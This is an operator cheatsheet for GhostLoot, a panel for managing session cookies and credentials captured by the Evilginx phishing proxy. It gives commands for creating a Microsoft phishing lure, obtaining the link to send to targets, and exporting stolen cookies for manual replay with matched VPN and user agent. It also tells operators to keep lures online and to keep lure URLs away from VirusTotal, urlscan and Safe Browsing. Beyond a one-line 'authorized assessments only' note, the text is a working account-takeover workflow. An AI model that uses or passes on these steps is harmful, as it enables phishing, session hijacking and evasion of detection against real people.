# GhostLoot cheatsheet

Authorized assessments only. GhostLoot is a **read-only** inbox for loot
Evilginx already captured. It does not ship Evilginx or phishlets.

## Install once

**On the Evilginx server**

```bash
git clone https://github.com/marcocarolasec/ghostloot.git
cd ghostloot
make build-linux                 # → ./evilginx-dashboard
sudo ./install.sh                # detects data.db, Evilginx, a free 127.0.0.1 port
```

**On your laptop**

```bash
./install-local.sh
ghostloot init user@server /path/to/ssh-key
```

If 8090 is taken, install picks 8091–8094 and prints the port. Use that
port as the last argument to `init`.

## Every day

```
ghostloot              start whatever is down, open the inbox
ghostloot status       tunnel / panel / evilginx
ghostloot down         stop the panel, close the tunnel
ghostloot console      Evilginx REPL (tmux attach)
ghostloot help         this sheet
```

`down` does **not** stop Evilginx. The phishlet keeps running. That is
intentional: closing the laptop should not take the lure offline.

## New lure

The inbox cannot create lures. Attach to Evilginx:

```bash
ghostloot console
```

You are in the Evilginx prompt (`:`). Tab completes.

```
phishlets                          # must be enabled, hostname already set
lures create microsoft             # use your phishlet name
lures                              # note the new id
lures edit <id> path /invoice      # optional
lures edit <id> redirect_url https://www.office.com
lures get-url <id>                 # this is the link you send
```

Leave without killing the server: **Ctrl-b**, then **d**.  
`Ctrl-c` stops Evilginx. Do not do that.

Paste the URL into GhostLoot → Lures if you want up/down on it. Do not
submit lure URLs to VirusTotal, urlscan or Safe Browsing.

## In the panel

Open http://127.0.0.1:8090 (GhostLoot does this for you). Press `?`.

```
1 inbox     2 captures     3 lures     4 settings
j k  move row              c  copy cookies (Cookie-Editor JSON)
b  replay brief            h  Cookie header
u  mark done               e  mark bounced
/  search
```

Replay is **manual**. Copy cookies, match VPN/UA, import on the host the
checklist says. Never replay from the VPS.

## What lives where

| | |
|---|---|
| Panel | `127.0.0.1:8090` on the server, via SSH tunnel on the laptop |
| Server config | `/etc/ghostloot.conf` |
| Laptop config | `~/.ghostloot/config` (`chmod 600`) |
| Loot DB | Evilginx `data.db` (read from a copy, never locked) |

## Don't

- Bind the panel to `0.0.0.0` or put it on the internet
- Submit lure URLs to VirusTotal / urlscan / Safe Browsing
- `pkill ssh` or `fuser -k` — `ghostloot down` closes **our** tunnel only
- Auto-replay from the server

## Uninstall the panel (server)

```bash
sudo systemctl disable --now ghostloot
sudo rm -f /etc/systemd/system/ghostloot.service /usr/local/bin/ghostloot /usr/local/bin/ghostloot-host
sudo rm -rf /opt/ghostloot /etc/ghostloot.conf
```

Evilginx is untouched.
